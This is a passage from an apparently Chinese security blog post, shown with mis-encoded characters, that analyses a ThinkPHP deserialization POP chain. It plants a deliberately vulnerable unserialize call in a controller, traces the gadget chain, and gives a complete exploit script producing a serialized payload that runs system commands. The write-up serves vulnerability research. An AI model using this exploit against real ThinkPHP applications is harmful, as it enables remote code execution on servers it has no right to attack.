<h3 id="è¸©å‘äºŒ"><a href="#è¸©å‘äºŒ" class="headerlink" title="è¸©å‘äºŒ"></a>è¸©å‘äºŒ</h3><p>update çš„æ—¶å€™æç¤ºï¼š<code>Your requirements could not be resolved to an installable set of packages. </code>è§£å†³åŠæ³•å¦‚ä¸‹ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#composer å¯ä»¥è®¾ç½®å¿½ç•¥ç‰ˆæœ¬åŒ¹é…</span></span><br><span class="line">composer update --ignore-platform-reqs</span><br></pre></td></tr></table></figure>

<h2 id="0x02-åˆ©ç”¨æ¡ä»¶"><a href="#0x02-åˆ©ç”¨æ¡ä»¶" class="headerlink" title="0x02-åˆ©ç”¨æ¡ä»¶"></a>0x02-åˆ©ç”¨æ¡ä»¶</h2><p>åˆ©ç”¨æ¡ä»¶ä¸ºå­˜åœ¨ <code>unserialize()</code> å‡½æ•°ä¸”å‚æ•°å¯æ§ã€‚æ‰‹åŠ¨åˆ›é€ æ¡ä»¶éªŒè¯æ¼æ´ï¼Œåœ¨Indexæ§åˆ¶å™¨ä¸­å†™å…¥ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">app</span>\<span class="title">BaseController</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">BaseController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;whoami&#x27;</span>]);   <span class="comment">// å‚æ•°å¯æ§çš„unserializeå‡½æ•°</span></span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Welcome to ThinkPHP!&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="0x03-æ„é€ POP"><a href="#0x03-æ„é€ POP" class="headerlink" title="0x03-æ„é€ POP"></a>0x03-æ„é€ POP</h2><p>ååºåˆ—åŒ–æ¼æ´èµ·ç‚¹é€šå¸¸ä¸º Â <code>__destruct()</code> åŠÂ <code>__wake()</code> ä¸¤ä¸ªé­”æœ¯å‡½æ•°ï¼Œå› ä¸ºå®ƒä»¬å°±æ˜¯ <code>unserialize</code> çš„è§¦å‘ç‚¹ã€‚</p>
<h3 id="æœç´¢-destruct-æ–¹æ³•"><a href="#æœç´¢-destruct-æ–¹æ³•" class="headerlink" title="æœç´¢ __destruct æ–¹æ³•"></a>æœç´¢ __destruct æ–¹æ³•</h3><p>å…¨æ–‡æœç´¢ <code>__destruct</code> ï¼Œå‘ç° <code>Model.php</code> å­˜åœ¨è¯¥æ–¹æ³•ï¼Œå°è¯•ä»è¯¥ç‚¹å‡ºå‘æŒ–æ˜ååºåˆ—åŒ–æ¼æ´ã€‚æ ¹æ® <code>__destruct</code> æ–¹æ³•ä»£ç å¯çŸ¥ï¼Œå½“ <code>$this-&gt;lazySave = True</code> çš„æ—¶å€™ï¼Œä¼šè¿›å…¥ <code>$this-&gt;save()</code> æ–¹æ³•ã€‚</p>
<h3 id="è·Ÿè¿›-save-æ–¹æ³•"><a href="#è·Ÿè¿›-save-æ–¹æ³•" class="headerlink" title="è·Ÿè¿› save() æ–¹æ³•"></a>è·Ÿè¿› save() æ–¹æ³•</h3><p>æ¼æ´åˆ©ç”¨ç‚¹å­˜åœ¨äº <code>$this-&gt;updateData()</code> å†…éƒ¨ï¼Œéœ€è¦è¿›å…¥ <code>$this-&gt;updateData()</code> æ–¹æ³•ï¼š</p>
<ol>
<li>åœ¨æ­¤ä¹‹å‰åˆ™ä¸èƒ½è¢« return ï¼Œæ‰€ä»¥ if è¯­å¥ä¸­çš„ <code>$this-&gt;isEmpty()</code> å¿…é¡»ç­‰äº <code>false</code> ä»¥åŠ <code>$this-&gt;trigger(&#39;BeforeWrite&#39;))</code> å¿…é¡»ç­‰äº <code>true</code> æ‰èƒ½é¿å… returnï¼›</li>
<li><code>$this-&gt;exists</code> å¿…é¡»ä¸º <code>true</code>ã€‚</li>
</ol>
<p>è·Ÿè¿› <code>$this-&gt;isEmpty()</code>ï¼Œè¦æƒ³ <code>$this-&gt;isEmpty() </code>ç­‰äº <code>false</code>ï¼Œåªéœ€è¦ <code>$tish-&gt;data </code>ä¸ç­‰äºç©ºã€‚</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isEmpty</span>(<span class="params"></span>): <span class="title">bool</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line"> <span class="keyword">return</span> <span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;data);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>è·Ÿè¿› <code>$this-&gt;trigger(&#39;BeforeWrite&#39;))</code>ï¼Œè¦æƒ³ <code>$this-&gt;trigger(&#39;BeforeWrite&#39;))</code> ç­‰äº <code>ture</code>ï¼Œåªéœ€è¦ <code>$this-&gt;withEvent</code> ç­‰äº <em>ç©º</em> æˆ– <code>false</code>ã€‚</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">trigger</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$event</span></span>): <span class="title">bool</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line"> <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;withEvent) &#123;</span><br><span class="line"> <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="variable">$call</span> = <span class="string">&#x27;on&#x27;</span> . <span class="title class_">Str</span>::<span class="title function_ invoke__">studly</span>(<span class="variable">$event</span>);</span><br><span class="line"> <span class="keyword">try</span> &#123;...&#125; <span class="keyword">catch</span> (ModelEventException <span class="variable">$e</span>) &#123;...&#125;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="è·Ÿè¿›-updateData-æ–¹æ³•"><a href="#è·Ÿè¿›-updateData-æ–¹æ³•" class="headerlink" title="è·Ÿè¿› updateData() æ–¹æ³•"></a>è·Ÿè¿› updateData() æ–¹æ³•</h3><p>æ¼æ´åˆ©ç”¨ç‚¹å­˜åœ¨äº <code>$this-&gt;checkAllowFields()</code> å†…éƒ¨ï¼Œéœ€è¦è¿›å…¥ <code>$this-&gt;checkAllowFields()</code> æ–¹æ³•ï¼Œåœ¨æ­¤ä¹‹å‰åˆ™ä¸èƒ½è¢« returnã€‚</p>
<p>ç¬¬ä¸€ä¸ª if è¯­å¥ä¸­ï¼Œ<code>$this-&gt;trigger(&#39;BeforeUpdate&#39;))</code> éœ€è¦ä¸º trueï¼Œä¸Šä¸€æ­¥å·²ç»è®¾ç½®ã€‚</p>
<p>ç¬¬äºŒä¸ª if è¯­å¥ä¸­ï¼Œ<code>$data</code> éœ€è¦ä¸º true æˆ–ä¸ä¸º <em>ç©º</em> ï¼Œ<code>$data</code> æ¥è‡ª <code>$this-&gt;getChangedData()</code>ï¼Œè·Ÿè¿› <code>$this-&gt;getChangedData()</code>ï¼Œåªéœ€è¦å°† <code>$this-&gt;force</code> ä¸º <code>true</code> å³å¯ç›´æ¥åŸå°ä¸åŠ¨è¿”å› <code>$this-&gt;$data</code> çš„å€¼ã€‚</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getChangedData</span>(<span class="params"></span>): <span class="title">array</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$data</span> = <span class="variable language_">$this</span>-&gt;force ? <span class="variable language_">$this</span>-&gt;data : <span class="title function_ invoke__">array_udiff_assoc</span>(<span class="variable">$this</span>-&gt;data, <span class="variable">$this</span>-&gt;origin, function (<span class="variable">$a</span>, <span class="variable">$b</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">empty</span>(<span class="variable">$a</span>) || <span class="keyword">empty</span>(<span class="variable">$b</span>)) &amp;&amp; <span class="variable">$a</span> !== <span class="variable">$b</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">is_object</span>(<span class="variable">$a</span>) || <span class="variable">$a</span> != <span class="variable">$b</span> ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// åªè¯»å­—æ®µä¸å…è®¸æ›´æ–°</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;<span class="keyword">readonly</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$field</span>) &#123;...&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="è·Ÿè¿›-checkAllowFields-æ–¹æ³•"><a href="#è·Ÿè¿›-checkAllowFields-æ–¹æ³•" class="headerlink" title="è·Ÿè¿› checkAllowFields() æ–¹æ³•"></a>è·Ÿè¿› checkAllowFields() æ–¹æ³•</h3><p>æ¼æ´åˆ©ç”¨ç‚¹å­˜åœ¨äº <code>$this-&gt;db()</code> å†…éƒ¨ï¼Œéœ€è¦è¿›å…¥ <code>$this-&gt;db()</code>ï¼Œå³ <code>$this-&gt;field</code> éœ€è¦ä¸ºç©ºï¼Œ<code>$this-&gt;schema</code> éœ€è¦ä¸ºç©ºã€‚<code>$this-&gt;field</code> åŠ <code>$this-&gt;schema</code> é»˜è®¤ä¸ºç©ºã€‚</p>
<h3 id="è·Ÿè¿›-db-æ–¹æ³•"><a href="#è·Ÿè¿›-db-æ–¹æ³•" class="headerlink" title="è·Ÿè¿› db() æ–¹æ³•"></a>è·Ÿè¿› db() æ–¹æ³•</h3><p>å·²ç»å¯ä»¥çœ‹åˆ°å­—ç¬¦æ‹¼æ¥æ“ä½œï¼Œå½“ä¸€ä¸ªç±»å¯¹è±¡è¢«å½“åšå­—ç¬¦ä¸²å¤„ç†çš„æ—¶å€™ï¼Œå°†ä¼šè§¦å‘è¯¥ç±»å¯¹è±¡çš„ <code>__toString()</code> é­”æœ¯æ–¹æ³•ã€‚</p>
<p>ç›®å‰ä¸ºæ­¢ï¼Œå‰åŠæ¡POPé“¾å·²ç»å®Œæˆï¼Œå³å¯ä»¥é€šè¿‡å­—ç¬¦ä¸²æ‹¼æ¥å»è°ƒç”¨Â <code>__toString()</code>ï¼Œæ‰€ä»¥å…ˆæ€»ç»“ä¸€ä¸‹æˆ‘ä»¬éœ€è¦è®¾ç½®çš„ç‚¹ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">$this</span>-&gt;lazySave == <span class="literal">true</span> </span><br><span class="line"><span class="variable language_">$this</span>-&gt;dataä¸ä¸ºç©º</span><br><span class="line"><span class="variable language_">$this</span>-&gt;withEvent == <span class="literal">false</span> </span><br><span class="line"><span class="variable language_">$this</span>-&gt;exists == <span class="literal">true</span> </span><br><span class="line"><span class="variable language_">$this</span>-&gt;force == <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<p>è°ƒç”¨è¿‡ç¨‹å¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">__destruct</span>()â€”â€”&gt;<span class="title function_ invoke__">save</span>()â€”â€”&gt;<span class="title function_ invoke__">updateData</span>()â€”â€”&gt;<span class="title function_ invoke__">checkAllowFields</span>()â€”â€”&gt;<span class="title function_ invoke__">db</span>()â€”â€”&gt;<span class="variable language_">$this</span>-&gt;table . <span class="variable language_">$this</span>-&gt;suffixï¼ˆå­—ç¬¦ä¸²æ‹¼æ¥ï¼‰â€”â€”&gt;<span class="title function_ invoke__">toString</span>()</span><br></pre></td></tr></table></figure>

<h3 id="æœ€ç»ˆåˆ©ç”¨"><a href="#æœ€ç»ˆåˆ©ç”¨" class="headerlink" title="æœ€ç»ˆåˆ©ç”¨"></a>æœ€ç»ˆåˆ©ç”¨</h3><p>ç»“åˆ Thinkphp 5.x çš„ååºåˆ—åŒ–é“¾ï¼Œ<code>__toString()</code> éƒ¨åˆ†ï¼Œå³å¯è§¦å‘ååºåˆ—åŒ–æ¼æ´ã€‚</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">__destruct</span>()â€”â€”&gt;<span class="title function_ invoke__">save</span>()â€”â€”&gt;<span class="title function_ invoke__">updateData</span>()â€”â€”&gt;<span class="title function_ invoke__">checkAllowFields</span>()â€”â€”&gt;<span class="title function_ invoke__">db</span>()â€”â€”&gt;<span class="variable language_">$this</span>-&gt;table . <span class="variable language_">$this</span>-&gt;suffixï¼ˆå­—ç¬¦ä¸²æ‹¼æ¥ï¼‰</span><br><span class="line">â€”â€”&gt;<span class="title function_ invoke__">__toString</span>()--&gt;<span class="title function_ invoke__">toJson</span>()--&gt;<span class="title function_ invoke__">toArray</span>()--&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>)--&gt;<span class="title function_ invoke__">getValue</span>()--&gt;<span class="variable">$closure</span>(<span class="variable">$value</span>, <span class="variable language_">$this</span>-&gt;data)(æœ€ç»ˆåˆ©ç”¨ç‚¹)</span><br></pre></td></tr></table></figure>

<h2 id="0x04-EXP"><a href="#0x04-EXP" class="headerlink" title="0x04-EXP"></a>0x04-EXP</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span> &#123;</span><br><span class="line"> <span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">Model</span></span><br><span class="line"> &#123;</span><br><span class="line"> <span class="title class_">protected</span> $<span class="title class_">withEvent</span>;</span><br><span class="line"> <span class="keyword">private</span> <span class="variable">$force</span>;</span><br><span class="line"> <span class="keyword">protected</span> <span class="variable">$table</span>;</span><br><span class="line"> <span class="keyword">private</span> <span class="variable">$data</span> ;</span><br><span class="line"> <span class="keyword">private</span> <span class="variable">$withAttr</span>;</span><br><span class="line"> <span class="keyword">private</span> <span class="variable">$lazySave</span>;</span><br><span class="line"> <span class="keyword">private</span> <span class="variable">$exists</span>;</span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$obj</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;withEvent = <span class="literal">false</span>;</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;force = <span class="literal">true</span>;</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;data = [<span class="string">&quot;evil_key&quot;</span> =&gt; <span class="string">&quot;pwd&quot;</span>];</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;withAttr = [<span class="string">&quot;evil_key&quot;</span> =&gt; <span class="string">&quot;system&quot;</span>];</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;lazySave = <span class="literal">true</span>;</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;exists = <span class="literal">true</span>;</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;table = <span class="variable">$obj</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span> &#123;</span><br><span class="line"> <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">Model</span>;</span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Pivot</span>();</span><br><span class="line"> <span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">Pivot</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">// echo urlencode(serialize($a));</span></span><br><span class="line"> <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="0x05-å‚è€ƒ"><a href="#0x05-å‚è€ƒ" class="headerlink" title="0x05-å‚è€ƒ"></a>0x05-å‚è€ƒ</h2><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9546#toc-18">https://xz.aliyun.com/t/9546#toc-18</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">singsing</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives">
          <span class="site-state-item-count">15</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
        <span class="site-state-item-count">7</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
        <span class="site-state-item-count">31</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">singsing</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  


</body>
</html>
